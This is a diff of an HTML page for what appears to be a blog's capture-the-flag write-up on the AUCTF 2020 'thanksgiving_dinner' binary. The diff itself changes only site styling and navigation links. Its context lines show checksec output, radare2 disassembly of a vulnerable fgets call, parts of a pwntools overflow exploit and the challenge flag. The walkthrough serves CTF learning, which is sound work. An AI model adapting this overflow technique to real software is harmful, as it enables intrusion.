@@ -68,9 +68,7 @@
 
 
 <script>$(document).on('click', function() { $('.collapse').collapse('hide'); })</script>
- <meta name="generator" content="Hugo 0.129.0">
-        
-
+ <meta name="generator" content="Hugo 0.161.1">
         
 
         
@@ -113,15 +111,11 @@
                     
                         <ul class="nav navbar-nav navbar-right">
                             
-                                <li class="navbar-icon"><a href="https://github.com/raffaeleflorio/"><i class="fab fa-github"></i></a></li>
-                            
                                 <li class="navbar-icon"><a href="https://www.linkedin.com/in/raffaeleflorio"><i class="fab fa-linkedin"></i></a></li>
-                            
-                                <li class="navbar-icon"><a href="https://twitter.com/raffaeleflorio_"><i class="fab fa-twitter"></i></a></li>
                             
                                 <li class="navbar-icon"><a href="https://hackernoon.com/u/raffaeleflorio"><i class="fas fa-user-astronaut"></i></a></li>
                             
-                                <li class="navbar-icon"><a href="/key.asc"><i class="fas fa-key"></i></a></li>
+                                <li class="navbar-icon"><a href="https://github.com/raffaeleflorio/"><i class="fab fa-github"></i></a></li>
                             
                                 <li class="navbar-icon"><a href="mailto:raffaeleflorio@protonmail.com"><i class="fas fa-envelope"></i></a></li>
                             
@@ -160,11 +154,11 @@
 <p>Note: ASLR is disabled for this challenge</p>
 </blockquote>
 <p>You could download the binary <a href="/ctf/auctf2020/binary/thanksgiving_dinner">here</a></p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ sha256sum ./thanksgiving_dinner
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ sha256sum ./thanksgiving_dinner
 </span></span><span style="display:flex;"><span>2307af59beead6a2377c3beb2ff26f70d5732ec6b651b5c31e58b8f692bfb70c thanksgiving_dinner
 </span></span></code></pre></div><h1 id="exploitation">Exploitation</h1>
 <p>The program simply ask for an input. But it seems not vulnerable to a buffer overflow:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ ./thanksgiving_dinner
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ ./thanksgiving_dinner
 </span></span><span style="display:flex;"><span>Hi!
 </span></span><span style="display:flex;"><span>Welcome to my program... it<span style="color:#e6db74">&#39;s a little buggy...
 </span></span></span><span style="display:flex;"><span><span style="color:#e6db74">Hey I heard you are searching for flags! Well I&#39;</span>ve got one. :<span style="color:#f92672">)</span>
@@ -175,7 +169,7 @@
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span>AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
 </span></span></code></pre></div><p>So I checked the binary with checksec. Then I opened with radare2.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ checksec ./thanksgiving_dinner
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ checksec ./thanksgiving_dinner
 </span></span><span style="display:flex;"><span>    Arch:     i386-32-little
 </span></span><span style="display:flex;"><span>    RELRO:    Partial RELRO
 </span></span><span style="display:flex;"><span>    Stack:    No canary found
@@ -183,7 +177,7 @@
 </span></span><span style="display:flex;"><span>    PIE:      PIE enabled
 </span></span><span style="display:flex;"><span>$ r2 -Ad ./thanksgiving_dinner
 </span></span></code></pre></div><p>Then I found two promising functions:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span><span style="color:#f92672">[</span>r2<span style="color:#f92672">]</span>&gt; afl
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span><span style="color:#f92672">[</span>r2<span style="color:#f92672">]</span>&gt; afl
 </span></span><span style="display:flex;"><span>.....
 </span></span><span style="display:flex;"><span>0x56556250    <span style="color:#ae81ff">7</span> <span style="color:#ae81ff">198</span>          sym.vulnerable
 </span></span><span style="display:flex;"><span>0x56556360    <span style="color:#ae81ff">3</span> <span style="color:#ae81ff">162</span>          sym.print_flag
@@ -195,7 +189,7 @@
 </span></span></code></pre></div><p>The <code>vulnerable</code> function is called by <code>main</code>. The <code>print_flag</code> function is called by <code>vulnerable</code>.</p>
 <p>So here is the interesting part about the latter.</p>
 <p>It gets an input a string and if some values are correct <code>print_flag</code> is called. Thanks the <code>fgets</code> we can overwrite those variables easily:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span><span style="color:#f92672">[</span>r2<span style="color:#f92672">]</span>&gt; pdf @sym.vulnerable
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span><span style="color:#f92672">[</span>r2<span style="color:#f92672">]</span>&gt; pdf @sym.vulnerable
 </span></span><span style="display:flex;"><span>.....
 </span></span><span style="display:flex;"><span>│           0x565562d9      6a24           push 0x24                   ; <span style="color:#ae81ff">36</span>
 </span></span><span style="display:flex;"><span>│           0x565562db      8d45d4         lea eax, <span style="color:#f92672">[</span>var_2ch<span style="color:#f92672">]</span>
@@ -218,7 +212,7 @@
 </span></span><span style="display:flex;"><span>│           0x56556314      c9             leave
 </span></span><span style="display:flex;"><span>└           0x56556315      c3             ret
 </span></span></code></pre></div><p>So this is my exploit:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#75715e">#!/usr/bin/python2</span>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#75715e">#!/usr/bin/python2</span>
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
 </span></span><span style="display:flex;"><span>
@@ -243,7 +237,7 @@
 </span></span><span style="display:flex;"><span>t<span style="color:#f92672">.</span>interactive()
 </span></span><span style="display:flex;"><span>t<span style="color:#f92672">.</span>close()
 </span></span></code></pre></div><p>And this is the flag:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ cat flag.txt
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ cat flag.txt
 </span></span><span style="display:flex;"><span>auctf<span style="color:#f92672">{</span>I_s@id_1_w@s_fu11!<span style="color:#f92672">}</span>
 </span></span></code></pre></div><p><img src="/ctf/auctf2020/images/thanksgiving-dinner-solved.png" alt="thanksgiving dinner solved banner"></p>
 </div>
@@ -330,9 +324,6 @@
 
 </div>
  
-    
-
-    
     
 
 </main>
